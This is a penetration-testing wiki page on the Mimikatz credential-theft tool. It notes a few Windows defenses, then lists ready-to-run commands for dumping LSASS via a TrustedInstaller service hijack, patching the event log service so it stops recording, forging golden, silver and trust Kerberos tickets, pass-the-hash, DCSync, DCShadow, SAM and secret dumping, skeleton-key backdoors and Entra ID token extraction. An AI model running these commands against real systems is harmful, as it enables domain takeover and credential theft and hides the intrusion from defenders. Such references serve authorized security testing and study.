# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!

## LM and Clear-Text in memory

From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:

- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.

- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.

Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.

On modern workstations this matters even more because **Credential Guard is enabled by default on many Windows 11 22H2+ and Windows Server 2025 domain-joined, non-DC systems**, while **LSASS-as-PPL is enabled by default on fresh Windows 11 22H2+ installs**. In practice, this means `sekurlsa::logonpasswords` often yields less material than older tradecraft expected and operators increasingly pivot to **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, or **CloudAP/PRT-oriented modules**. For the protection side, check [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.

### Kerberos Ticket Attacks

Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
  - `/domain`: The domain name.
  - `/sid`: The domain's Security Identifier (SID).
  - `/user`: The username to impersonate.
  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
  - `/ptt`: Directly injects the ticket into memory.
  - `/ticket`: Saves the ticket for later use.

Example:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Tickets grant access to specific services. Key command and parameters:

- Command: Similar to Golden Ticket but targets specific services.
- Parameters:
  - `/service`: The service to target (e.g., cifs, http).
  - Other parameters similar to Golden Ticket.

Example:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Creation

Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:

- Command: Similar to Golden Ticket but for trust relationships.
- Parameters:
  - `/target`: The target domain's FQDN.
  - `/rc4`: The NTLM hash for the trust account.

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Additional Kerberos Commands

- **Listing Tickets**:

  - Command: `kerberos::list`
  - Lists all Kerberos tickets for the current user session.

- **Pass the Cache**:

  - Command: `kerberos::ptc`
  - Injects Kerberos tickets from cache files.
  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

  - Command: `kerberos::ptt`
  - Allows using a Kerberos ticket in another session.
  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
  - Command: `kerberos::purge`
  - Clears all Kerberos tickets from the session.
  - Useful before using ticket manipulation commands to avoid conflicts.

### Over-Pass-the-Hash / Pass-the-Key

If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` reuses the current process instead of spawning a new console, which is handy when you want to immediately run things like `lsadump::dcsync` in the same context.

### Active Directory Tampering

- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation. See [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Mimic a DC to request password data. See [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extract credentials from LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.

  - _No specific command provided for NetSync in original context._

- **LSADUMP::SAM**: Access local SAM database.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Retrieve trust authentication information.
  - `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

On **Entra ID** or **hybrid-joined** hosts, `sekurlsa::cloudap` can expose cached **Primary Refresh Token (PRT)** material from LSASS. If the associated Proof-of-Possession key is software-protected, `dpapi::cloudapkd` can derive the clear/derived key material needed for follow-on **Pass-the-PRT** workflows.

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

This becomes much harder when the key is TPM-backed, but it is worth checking on hybrid endpoints because the cached CloudAP data may be more interesting than classic `wdigest` output. For the cloud-side abuse chain, see [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Acquire backup rights.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtain debug privileges.
  - `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Change SID and SIDHistory.

  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: Impersonate tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Allow multiple RDP sessions.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: List TS/RDP sessions.
  - _No specific command provided for TS::Sessions in original context._

### Vault

- Extract passwords from Windows Vault.
  - `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}



